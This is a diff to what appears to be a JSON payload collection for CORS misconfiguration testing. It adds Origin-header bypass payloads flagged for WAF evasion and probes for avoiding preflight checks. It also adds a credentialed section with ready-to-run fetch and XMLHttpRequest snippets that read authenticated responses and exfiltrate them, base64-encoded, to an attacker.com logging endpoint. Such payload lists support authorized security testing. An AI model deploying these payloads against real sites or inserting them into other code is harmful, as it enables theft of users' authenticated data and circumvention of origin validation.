@@ -8,7 +8,10 @@
         {"payload": "Origin: https://evil.com", "description": "Evil origin reflection test", "waf_bypass": false},
         {"payload": "Origin: https://target.com.attacker.com", "description": "Subdomain of target appended to attacker domain to bypass suffix checks", "waf_bypass": true},
         {"payload": "Origin: https://attacker.comtarget.com", "description": "Attacker domain prefixed with target to bypass prefix checks", "waf_bypass": true},
-        {"payload": "Origin: https://target.com:8080", "description": "Port-based bypass — validators match domain but not port", "waf_bypass": true}
+        {"payload": "Origin: https://target.com:8080", "description": "Port-based bypass — validators match domain but not port", "waf_bypass": true},
+        {"payload": "Origin: https://evilorigin.com", "description": "Regex bypass: matches 'origin.com' substring in validator using /origin\\.com/", "waf_bypass": true},
+        {"payload": "Origin: https://target.com%60attacker.com", "description": "Backtick injection in origin — parser confusion in some server frameworks", "waf_bypass": true},
+        {"payload": "Origin: https://target.com_.attacker.com", "description": "Underscore subdomain bypass for lax wildcard matching", "waf_bypass": true}
       ]
     },
     "null_origin": {
@@ -32,7 +35,20 @@
       "description": "Test CORS preflight handling and simple request bypass",
       "payloads": [
         {"payload": "Origin: https://attacker.com\r\nAccess-Control-Request-Method: GET", "description": "Simple GET request with origin (no preflight for simple requests)", "waf_bypass": false},
-        {"payload": "Origin: https://attacker.com\r\nAccess-Control-Request-Method: POST\r\nContent-Type: text/plain", "description": "POST with text/plain bypasses preflight (simple request)", "waf_bypass": false}
+        {"payload": "Origin: https://attacker.com\r\nAccess-Control-Request-Method: POST\r\nContent-Type: text/plain", "description": "POST with text/plain bypasses preflight (simple request)", "waf_bypass": false},
+        {"payload": "Origin: https://attacker.com\r\nContent-Type: application/x-www-form-urlencoded", "description": "POST with form-urlencoded avoids preflight — simple request type", "waf_bypass": false},
+        {"payload": "Origin: https://attacker.com\r\nContent-Type: multipart/form-data", "description": "POST with multipart/form-data avoids preflight — simple request type", "waf_bypass": false},
+        {"payload": "Origin: https://attacker.com\r\nAccess-Control-Request-Headers: X-Custom-Header", "description": "Probe if server allows custom headers — triggers preflight, check ACAH response", "waf_bypass": false},
+        {"payload": "Origin: https://attacker.com\r\nAccess-Control-Request-Method: PUT", "description": "Test if preflight allows non-simple methods like PUT", "waf_bypass": false}
+      ]
+    },
+    "credentialed_test": {
+      "description": "Test credentialed CORS requests — Access-Control-Allow-Credentials: true with various origins",
+      "payloads": [
+        {"payload": "fetch('TARGET_URL',{credentials:'include',mode:'cors'}).then(r=>r.text()).then(d=>new Image().src='https://attacker.com/log?d='+btoa(d))", "description": "JS fetch with credentials:include — exfiltrate response if ACAO reflects and ACAC:true", "waf_bypass": false},
+        {"payload": "Origin: https://attacker.com", "description": "Test if ACAO reflects origin AND ACAC:true — both needed for credential theft", "waf_bypass": false},
+        {"payload": "Origin: null", "description": "Test if ACAO:null with ACAC:true — exploitable via sandboxed iframe", "waf_bypass": false},
+        {"payload": "var x=new XMLHttpRequest();x.open('GET','TARGET_URL');x.withCredentials=true;x.onload=function(){new Image().src='https://attacker.com/?d='+btoa(x.responseText)};x.send()", "description": "XHR with withCredentials=true — classic credentialed CORS exfil", "waf_bypass": false}
       ]
     }
   }
